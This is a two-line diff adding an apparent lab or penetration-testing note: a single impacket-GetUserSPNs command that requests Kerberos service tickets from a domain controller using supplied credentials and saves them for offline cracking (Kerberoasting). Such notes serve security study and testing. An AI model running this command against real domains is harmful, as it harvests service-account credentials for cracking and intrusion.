@@ -1,0 +1,2 @@
+Requesting the Kerberos Ticket
+impacket-GetUserSPNs -request -dc-ip 10.3.32.11 l33thackers.stellar.tech/tou:'password' -outputfile l33tspnauthtickets.txt
